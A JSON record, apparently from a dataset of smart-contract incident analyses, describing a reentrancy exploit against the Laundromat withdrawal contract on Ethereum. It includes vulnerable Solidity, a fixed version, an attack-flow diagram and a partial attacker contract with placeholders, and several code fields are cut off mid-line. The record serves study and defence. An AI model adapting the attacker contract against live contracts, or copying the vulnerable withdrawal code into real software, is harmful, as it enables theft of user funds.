@@ -1,0 +1,32 @@
+{
+ "id": "2025__2025-04-08_Laundromat_WithdrawReentrancy",
+ "source_file": "2025/2025-04-08_Laundromat_WithdrawReentrancy.md",
+ "title": "Laundromat — Withdrawal Process Reentrancy Attack Analysis",
+ "date": "2025-04-08",
+ "protocol": "Laundromat",
+ "chain": "Ethereum",
+ "loss_raw": "~1,500 USD",
+ "loss_usd": null,
+ "root_cause": "Reentrancy possible in the multi-step withdrawal process (withdrawStart → withdrawStep → withdrawFinal)",
+ "attack_tx": "0x08ffb5f7...",
+ "vulnerable_contract": "0x934cbbe5377358e6712b5f041d90313d935c501c",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable withdrawal process: no reentrancy protection\ncontract Laundromat {\n    mapping(address => uint256) public deposits;\n    mapping(address => uint256) public withdrawPhase;\n\n    function withdrawStart(\n        uint256[] calldata amounts,\n        uint256 a, uint256 b, uint256 c\n    ) external {\n        // Initiate withdrawal (set phase)\n        withdrawPhase[msg.sender] = 1;\n    }\n\n    function withdrawStep() external {\n        require(withdrawPhase[msg.sender] >= 1);\n        //",
+  "❌ ETH transfer before state update\n        (bool success,) = msg.sender.call{value: STEP_AMOUNT}(\"\");\n        //",
+  "❌ Reentrancy possible at this point\n        withdrawPhase[msg.sender]++; // Update is too late\n    }\n\n    function withdrawFinal() external returns (bool) {\n        // Finalize withdrawal\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct code\nfunction withdrawStep() external nonReentrant { //",
+  "✅ Reentrancy protection\n    require(withdrawPhase[msg.sender] >= 1);\n    withdrawPhase[msg.sender]++; //"
+ ],
+ "steps": [
+  "► ETH sent to contract → receive() callback triggered"
+ ],
+ "other_code": [
+  "Attacker Contract (attack executed from constructor)\n  │\n  ├─[1]─► Call Laundromat.deposit() (deposit small amount of ETH)\n  │\n  ├─[2]─► Call Laundromat.withdrawStart([amounts], ...)\n  │         └─► Initiate withdrawal process\n  │\n  ├─[3]─► First call to Laundromat.withdrawStep()\n  │         └─► ETH sent to contract → receive() callback triggered\n  │                                          │\n  ├─[4]◄─────────────────────────────────────┘\n  │         └─► Re-enter withdrawStep() from receive()\n  │               └─► Receive additional ETH\n  │               └─► Recursively repeats...\n  │\n  ├─[5]─► Call Laundromat.withdrawFinal()\n  │\n  └─[6]─► Loss: ~1,500 USD",
+  "// 0x2E95CFC93EBb0a2aACE603ed3474d451E4161578\ncontract AttackerC {\n    constructor() {\n        // [1] Deposit\n        (bool s1,) = Laundromat.call{value: DEPOSIT_AMOUNT}(\n            abi.encodeWithSignature(\"deposit(uint256,uint256)\", ...)\n        );\n        require(s1);\n\n        // [2] Initiate withdrawal\n        (bool s2,) = Laundromat.call(\n            abi.encodeWithSignature(\"withdrawStart(uint256[],uint256,uint256,uint256)\", ...)\n        );\n        require(s2);\n\n        // [3] First withdrawStep call (triggers reentrancy chain)\n        (bool s3,) = Laundromat.call(\n            abi.encodeWithSignature(\"withdrawStep()\")\n        );\n        require(s3);\n\n        // [6] Final withdrawal\n        (bool sf,) = Laundromat.call(\n            abi.encodeWithSignature(\"withdrawFinal()\")\n        );\n"
+ ]
+}
